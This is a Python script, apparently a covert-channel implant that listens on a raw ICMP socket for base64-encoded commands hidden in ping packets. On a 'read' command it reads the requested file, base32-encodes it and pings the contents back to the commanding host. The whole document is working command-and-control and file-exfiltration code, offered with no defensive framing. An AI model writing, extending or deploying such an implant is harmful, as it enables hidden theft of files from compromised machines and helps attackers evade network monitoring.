import socket 
import re 
import base64
import sys
from scapy.all import sr1, IP, ICMP, send, srp1
import  os
from threading import Thread

#Just some simple logic to read a file
def readFile(path):
  with(open(os.path.expanduser(path), 'r')) as file:
    data = file.read().replace("\n","")
    return data

#Send back a ICMP Response  
def sendPing(to, data):
  packet = IP(dst=to, src="<Your IP>")/ICMP()/data
  response = send(packet, iface="<Your interface>")

def rcvPing():
  #Create the socket
  s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
  s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
  while 1:
    #listen for incoming ICMP packets
    data, addr = s.recvfrom(1508)
    print("Packet from %r: %r" % (addr,data))
    try:
      #Seach for {} wrapped base64 data
      command = re.findall(r'{(.*?)}',str(data))[0]
      decodedCommand = base64.b64decode(command).decode("utf-8")
      allCommands = re.findall(r'{(.*?)}',decodedCommand)
      #Check the command list
      for command in allCommands:
        if "read" in command:
          path = command.split(" ")[1]
          data = "{gathered "+readFile(path)+"}"
          dataBytes = data.encode("utf-8")
          #Send your data back base32 encoded.
          b32bytes = base64.b32encode(dataBytes)
          encodedFile = b32bytes.decode("utf-8")
          #Anser your commander
          sendPing(addr[0], "{"+encodedFile+"}")
    except:
      print("Appears to be normal data!")

#Start listening
rcvPing()
